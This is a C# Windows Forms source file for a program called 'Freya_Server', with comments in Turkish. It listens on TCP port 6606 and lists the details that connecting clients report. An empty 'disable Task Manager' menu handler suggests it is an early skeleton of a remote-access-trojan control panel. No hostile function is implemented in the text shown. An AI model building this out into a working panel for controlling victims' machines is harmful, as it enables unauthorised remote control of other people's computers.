using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Freya_Server
{
    public partial class Form1 : Form
    {
        private TcpListener server = null;
        private List<Thread> clientThreads = new List<Thread>();
        private bool isServerRunning = false;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            listView1.FullRowSelect = true;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (!isServerRunning)
            {
                Thread serverThread = new Thread(StartServer);
                serverThread.Start();

                button2.Text = "Stop Server";

            }
            else
            {
                StopServer();
                button2.Text = "Start Server";
            }
        }

        private void StartServer()
        {
            try
            {
                int port = 6606;
                server = new TcpListener(IPAddress.Any, port);
                server.Start();

                isServerRunning = true;

                while (isServerRunning)
                {
                    TcpClient client = null;

                    try
                    {
                        client = server.AcceptTcpClient();

                        Thread clientThread = new Thread(new ParameterizedThreadStart(HandleClient));
                        clientThreads.Add(clientThread);
                        clientThread.Start(client);
                    }
                    catch (SocketException)
                    {
                        break;
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("Hata: " + ex.Message);
                    }
                }
            }
            finally
            {
                StopServer(); // Sunucu kapatıldığında temizlik yap
            }
        }

        private void StopServer()
        {
            // Sunucuyu kapatma işlemleri
            isServerRunning = false;

            foreach (Thread thread in clientThreads)
            {
                thread.Join(); // Her iş parçacığının tamamlanmasını bekleyin
            }

            clientThreads.Clear(); // İş parçacığı listesini temizleyin
            server?.Stop(); // Sunucuyu kapatın
            //MessageBox.Show("Sunucu kapatıldı...");
        }

        private void HandleClient(object obj)
        {
            TcpClient tcpClient = (TcpClient)obj;

            try
            {
                NetworkStream clientStream = tcpClient.GetStream();

                using (var reader = new System.IO.StreamReader(clientStream, Encoding.UTF8))
                using (var writer = new System.IO.StreamWriter(clientStream, Encoding.UTF8))
                {
                    string clientMessage = reader.ReadLine();

                    string[] splitted = clientMessage.Split('|');

                    if (splitted[0] == "clientInfo")
                    {
                        // clientInfo mesajı geldiğinde ListView'a veri ekle
                        this.Invoke((MethodInvoker)delegate
                        {
                            ListViewItem satır = new ListViewItem(splitted[1]);
                            satır.SubItems.Add(splitted[2]);
                            satır.SubItems.Add(splitted[3]);
                            satır.SubItems.Add(splitted[4]);
                            satır.SubItems.Add(splitted[5]);
                            satır.SubItems.Add(splitted[6]);
                            satır.SubItems.Add(splitted[7]);
                            satır.SubItems.Add(splitted[8]);

                            listView1.Items.AddRange(new ListViewItem[] { satır, });

                        });
                    }
                }
            }
            finally
            {
                //tcpClient.Close(); // İstemci bağlantısını kapat
            }
        }


        private void disableTaskManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }
    }
}
